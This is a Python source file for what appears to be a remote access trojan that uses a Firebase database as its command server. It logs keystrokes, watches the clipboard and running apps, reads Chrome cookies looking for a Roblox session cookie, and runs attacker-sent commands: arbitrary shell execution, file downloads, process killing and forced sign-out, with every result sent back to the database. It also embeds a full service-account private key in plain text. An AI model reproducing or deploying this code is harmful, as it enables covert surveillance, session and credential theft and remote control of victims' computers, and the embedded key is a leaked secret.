import os
import time
import threading
import psutil
import requests
import keyboard
import browser_cookie3 as cookie
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, db
import subprocess
import pyperclip
import sys

# --- CONFIG ---
FIREBASE_DB_URL = "https://accdatabase-78d8f-default-rtdb.firebaseio.com/"
SERVICE_KEY = {
  "type": "service_account",
  "project_id": "accdatabase-78d8f",
  "private_key_id": "0c30399aee44500abbf811679fb091ff42396866",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC209ArMxiLK7U5\nIGuao6fSXkaq4ullfR8FIKul9GwjgRb3P3S3bP9QO+z3CRZCPMRJ6L2j4G/ASemo\nWkGZLgf+6Enw5WFv3CLnihw9Ly1tQI7NyzOEj0BfIwow9L4Gd9AgvZFNsjpYgq6k\nCOGX8+kyshEZILTzf+PpcMkI0wqz4pt4K9BRNbHKXYxOLnK2No9yFn3xK8wLzUKb\nzPxC6Ttz+hGOMGvaSgXHxsEut2ALMLNVT4kfWlOr+s7+3J9MliTjk/YtTf/a1WCR\nKJT6z1xXlHgDzCYodfXsJXmPirjDSXeS7VB91+AudLKoE0RPHktgBfVFTbWS7db7\nNktTyLFDAgMBAAECggEAQBECehjqKV60HyQmwOZHeVbzEY/5dMh/NcdIjxuTR2/F\nkffJGTvXThDpzXmANM7hg/rMdaBA2NOtzwJtyVVRlPhmbMWcutub2aJSmfgtxYKh\naCkkUPf3+T6opBYnftG+e7KiN+VUP87vjujT0PE2jz7J8hG9hzSSM6wDrpVxwy32\nUQOWbvv2Y0VyAOxAiy4PUS0qqaskcKYgA5e5ESWY77j78OIrWigiKt6oZL+iw6fH\nJ/fCNGIuAz7qMDUqK0rKlRbPHBnK/zHg9uWIUgDnvWOx4/hjqAysvxuLAlgwCv15\nnq0IYiJ9h830tGC2AwniCQp5Clz8I6FU7LVGYH9JVQKBgQDf/IKhSxpA+iJHyEkK\nRf+/I5Fg0775q9hH3hTQC4waSw8nqa/jaKekbZKP4x5Fda1W1/qkpHPwJn50JGsC\nzTCfd3IRqqWE5vNmU2XYGL+9/zuqsIrues+n2157jk654D7qwRom3eelNxJKNuBh\nNcU5+1TKIxXFJ2ZXWi1lZh3mVwKBgQDQ9VPbvh65lcLO9gXDUPetHjsNxz423Pom\nYTknmONvYxK/Bah3DPnDyYsqUXd6ckKA8CMaEBhDJTVl/lbanC3Qjji7Hc4pgv3F\natnZWjxpIYDsUWr9c6tpoRoU8Pw1EjuEr6PxTUidQjiSlfrRcdirKeKZglFfEL9H\nPwyNsKbA9QKBgQCZqQF05bD9Ipyh4iU5hwwMdLonUxyQ6/NUWmas0z8qSpP7Ac5I\nlGNtyj3huE3sGO7xxPmOOcPP3Jij1NgU8++HdsoqlIc4xbf1WwFjXpcsIQ0t7C9j\nq50J6tTGrroTimOfaRonz9Q6460IfN0x01GalXF1utwUhRMQmizKg2O/wQKBgDTl\nRXsk34Y/QPc/FCpjPq9WLcDJJRiiS7iXd+5sJ3a077PnbMPmRvum81GdGc+nSOp2\n34vjcyDcNG5DOh1Q19ApkHbdjqi3fiIRcGAzFYPPdWFdIuZR95xfqciPUGjm2qY2\nCBw3YiBc+REyYjHOzfhWPAR8Frkn9iPE9BqSE0RZAoGAMW8hT/RylAIoVzV7QDXP\n69XtVcnLTBPvJ9JPSdTLoS0/oO7bN/qHM71SbyNGbSZwmWQbHtNwDyUHGai84wYK\n9jmLR/dr2a1jJ4Pj/7Qi3F0lSpOJWC2H7WInWeqi1RpPbsxs7ITI5HrEu0jhaLhn\nzPTRKe3l26Nf5U06lRRXBII=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@accdatabase-78d8f.iam.gserviceaccount.com",
  "client_id": "108491912306959548034",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40accdatabase-78d8f.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

# --- Firebase setup ---
cred = credentials.Certificate(SERVICE_KEY)
firebase_admin.initialize_app(cred, {"databaseURL": FIREBASE_DB_URL})

# --- Unique computer registration ---
pc_base_name = os.getenv("USER") or os.getenv("USERNAME")
computer_name = pc_base_name
computers_ref = db.reference("computers")

existing_names = computers_ref.get() or {}
counter = 1
while computer_name in existing_names:
    computer_name = f"{pc_base_name}-{counter}"
    counter += 1

computer_ref = computers_ref.child(computer_name)
computer_ref.update({
    "is_online": True,
    "last_seen": datetime.utcnow().isoformat(),
    "commands": {}
})

# --- Shared variables ---
buffer = []
last_key_time = time.time()
lock = threading.Lock()
already_open_apps = set()
stop_worker = False

# --- Firebase helpers ---
def report(message=""):
    ts = datetime.utcnow().isoformat()
    if message:
        computer_ref.child("reports").push({"message": message, "timestamp": ts})
    computer_ref.update({"last_seen": ts, "is_online": True})

def status(is_online: bool):
    computer_ref.update({"is_online": is_online, "last_seen": datetime.utcnow().isoformat()})

# --- Functionalities ---
WEBSITES = {
    "cookies": [
        {"url": "https://roblox.com", "cookie": ".ROBLOSECRUITY"}
    ]
}

def check_cookies():
    try:
        cj = cookie.chrome()
        req = requests.Session()
        req.cookies.update(cj)
        for web in WEBSITES["cookies"]:
            req.get(web["url"])
            for c in req.cookies:
                if c.name == web["cookie"] and c.value:
                    report(f"Cookie detected: {c.name}")
    except Exception:
        pass

def keylogger_poll():
    global last_key_time
    try:
        for key in keyboard._pressed_events:
            with lock:
                buffer.append(key.name)
                last_key_time = time.time()
        with lock:
            if buffer and time.time() - last_key_time > 1.5:
                report("Keylogger: " + " ".join(buffer))
                buffer.clear()
    except Exception:
        pass

def monitor_apps():
    global already_open_apps
    try:
        current_apps = {p.name() for p in psutil.process_iter()}
        for app in current_apps - already_open_apps:
            report(f"OPENED {app}")
            already_open_apps.add(app)
        for app in already_open_apps - current_apps:
            report(f"CLOSED {app}")
            already_open_apps.remove(app)
    except Exception:
        pass

# --- Command executor ---
def execute_command(cmd_dict):
    command = cmd_dict.get("command")
    args = cmd_dict.get("args", [])

    try:
        # --- SYSTEM / MONITORING ---
        if command == "checksys":
            # CPU
            cpu_percent = psutil.cpu_percent(interval=1)
            cpu_cores = psutil.cpu_count(logical=False)
            cpu_threads = psutil.cpu_count(logical=True)
            # RAM
            ram = psutil.virtual_memory()
            ram_total = round(ram.total / (1024**3), 2)  # GB
            ram_used = round(ram.used / (1024**3), 2)
            ram_percent = ram.percent
            # Disk
            disk = psutil.disk_usage("/")
            disk_total = round(disk.total / (1024**3), 2)
            disk_used = round(disk.used / (1024**3), 2)
            disk_percent = disk.percent
            # Network
            net = psutil.net_io_counters()
            net_sent = net.bytes_sent
            net_recv = net.bytes_recv
            # GPU
            try:
                import GPUtil
                gpus = GPUtil.getGPUs()
                gpu_info = "; ".join([
                    f"{gpu.name} Load:{gpu.load*100:.1f}% Mem:{gpu.memoryUsed}/{gpu.memoryTotal}MB Temp:{gpu.temperature}C"
                    for gpu in gpus
                ]) or "No GPU detected"
            except:
                gpu_info = "GPU info unavailable"
            # OS info
            import platform
            os_name = platform.system()
            os_version = platform.version()
            architecture = platform.machine()
            # Report
            report(
                f"System Report:\n"
                f"OS: {os_name} {os_version} ({architecture})\n"
                f"CPU: {cpu_percent}% ({cpu_cores} cores / {cpu_threads} threads)\n"
                f"RAM: {ram_used}/{ram_total} GB ({ram_percent}%)\n"
                f"Disk: {disk_used}/{disk_total} GB ({disk_percent}%)\n"
                f"Network: Sent {net_sent} B, Received {net_recv} B\n"
                f"GPU: {gpu_info}"
            )

        # --- COMMAND SHELL EXECUTION ---
        elif command == "cse":
            if args:
                result = subprocess.run(args, capture_output=True, text=True, shell=True)
                output = (result.stdout + result.stderr)[:1000]  # truncate output
                report(f"CSE output:\n{output}")
            else:
                report("CSE command requires arguments")

        # --- CLIPBOARD ---
        elif command == "clipboard":
            try:
                import pyperclip
                current = pyperclip.paste()
                report(f"Clipboard content: {current}")
            except Exception as e:
                report(f"clipboard error: {e}")

        # --- NETWORK MONITORING ---
        elif command == "netmon":
            net = psutil.net_io_counters()
            report(f"Network - Sent: {net.bytes_sent} B, Received: {net.bytes_recv} B")

        # --- PROCESS CONTROL ---
        elif command == "prc":
            if not args:
                report("PRC command requires arguments: ['kill'/'terminate', process_name_or_pid]")
            else:
                action = args[0].lower()
                target = args[1] if len(args) > 1 else None
                if not target:
                    report("PRC command missing process target")
                else:
                    try:
                        affected = []
                        for p in psutil.process_iter(['pid', 'name']):
                            if str(p.info['pid']) == target or p.info['name'].lower() == target.lower():
                                if action == "kill":
                                    p.kill()
                                    affected.append(p.info['name'])
                                elif action == "terminate":
                                    p.terminate()
                                    affected.append(p.info['name'])
                        if affected:
                            report(f"PRC {action}: {', '.join(affected)}")
                        else:
                            report(f"No matching process found for {target}")
                    except Exception as e:
                        report(f"PRC error: {e}")

        # --- FILE / PROGRAM OPERATIONS ---
        elif command == "listpath":
            if not args:
                report("listpath requires a path argument")
            else:
                path = args[0]
                try:
                    items = os.listdir(path)
                    report(f"Contents of {path}: {', '.join(items[:50])}")  # limit output
                except Exception as e:
                    report(f"listpath error: {e}")

        elif command == "install":
            if len(args) < 2:
                report("install requires URL and destination path")
            else:
                url, dest_path = args[0], args[1]
                try:
                    r = requests.get(url)
                    with open(dest_path, "wb") as f:
                        f.write(r.content)
                    report(f"Downloaded {url} to {dest_path}")
                except Exception as e:
                    report(f"install error: {e}")

        elif command == "listapps":
            try:
                start_menu = os.path.join(os.getenv("PROGRAMDATA"), "Microsoft\\Windows\\Start Menu\\Programs")
                apps = []
                for root, dirs, files in os.walk(start_menu):
                    for file in files:
                        if file.endswith(".lnk"):
                            apps.append(file)
                report(f"Installed apps: {', '.join(apps[:50])}")  # limit output
            except Exception as e:
                report(f"listapps error: {e}")

        elif command == "listprograms":
            try:
                running = [p.name() for p in psutil.process_iter()]
                report(f"Running programs: {', '.join(running[:50])}")  # limit to 50
            except Exception as e:
                report(f"listprograms error: {e}")

        # --- SYSTEM ACTION ---
        elif command == "signout":
            try:
                subprocess.run(["shutdown", "/l"], creationflags=subprocess.CREATE_NO_WINDOW)
                report("Sign out command executed")
            except Exception as e:
                report(f"signout error: {e}")

        # --- FALLBACK ---
        else:
            report(f"Unknown command: {command}")

    except Exception as e:
        report(f"Command error ({command}): {e}")

def fetch_commands():
    try:
        commands = computer_ref.child("commands").get() or {}
        for key, cmd in commands.items():
            execute_command(cmd)
            computer_ref.child("commands").child(key).delete()
    except Exception:
        pass

# --- Worker loop ---
def worker_loop():
    clipboard_last = ""
    while not stop_worker:
        try:
            # --- Periodic cookie check ---
            try:
                check_cookies()
            except:
                pass

            # --- Keylogger polling ---
            try:
                keylogger_poll()
            except:
                pass

            # --- Monitor opened/closed apps ---
            try:
                monitor_apps()
            except:
                pass

            # --- Fetch and execute Firebase commands ---
            try:
                fetch_commands()
            except:
                pass

            # --- Periodic status update ---
            try:
                status(True)
            except:
                pass

            # --- Periodic clipboard monitoring ---
            try:
                current_clip = pyperclip.paste()
                if current_clip != clipboard_last:
                    report(f"Clipboard changed: {current_clip}")
                    clipboard_last = current_clip
            except:
                pass

            # --- Periodic network monitoring ---
            try:
                net = psutil.net_io_counters()
                report(f"Network (periodic) - Sent: {net.bytes_sent} B, Received: {net.bytes_recv} B")
            except:
                pass

        except Exception:
            pass

        time.sleep(1)

# --- Start worker ---
worker_thread = threading.Thread(target=worker_loop, daemon=True)
worker_thread.start()

# --- Keep main thread alive ---
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    stop_worker = True
    worker_thread.join()
    worker_thread.join()
